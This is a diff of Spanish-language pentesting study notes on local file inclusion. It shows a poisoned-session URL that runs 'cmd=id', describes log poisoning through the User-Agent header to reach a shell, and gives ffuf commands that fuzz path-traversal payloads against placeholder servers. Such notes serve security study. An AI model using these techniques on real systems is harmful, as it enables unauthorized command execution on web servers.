@@ -147,7 +147,7 @@ y luego evocarla desde el FLI
         http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
 
 
-#############Server log poisoning
+### Server log poisoning
 
 apache y ngnx guardan varios logs como access.log y error.log
 
@@ -156,12 +156,17 @@ este log, con modificar el user-agent en una request podemos acceder a una shell
 Ngnx permite esta lectura a usuarios con bajos privilegios, mientras que apache solo a admins o roots(aunque en versiones viejas
 o mal configuradas puede funcionar)
 los logs de apache están guardados por default en:
-linux : /var/log/apache2/
-windows: C:\xampp\apache\logs\
+##### Linux
+                /var/log/apache2/
+##### Windows
+                C:\xampp\apache\logs\
 
 mientras que en nginx:
-linux: /var/log/nginx/
-windows: C:\nginx\log\
+
+##### Linux 
+                /var/log/nginx/
+##### Windows
+                C:\nginx\log\
 
 podriamos visitar alguno de estos logs envenenando el user agent, luego cuando los volvamos a visitar, podríamos agregar el
 parametro de la shell y tirar comandos
@@ -177,33 +182,38 @@ Dependiendo de a qué tengamos acceso.
 
 También podemos probar envenenar los proc /proc/self/environ o /proc/self/fd/(N) (N es un número usualmente de 0 a 50)
 
-################################## Automatización:
+### Automatización:
 
 
 
 
 Podemos buscar parámetros con fuff y luego probar con el intruder de burp la lista "SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
 Parametros:
-ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'
+
+                ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'
 
 valores:
-ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'
+
+                ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'
 
 
-###Relative paths:
+#### Relative paths:
 
 Algunas veces no sabémos cómo llegar a un archivo envenenado que subimos. podemos usar listas específicas con fuff para
 determinar el path de de la web:
-ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+
+                ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
 Esta lista tiene su par en windows en el mismo directorio.
 
-###log paths:
+#### Log paths:
 
 listas recomendadas:
 
 https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
 https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
-ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+
+
+                ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
 
 
 
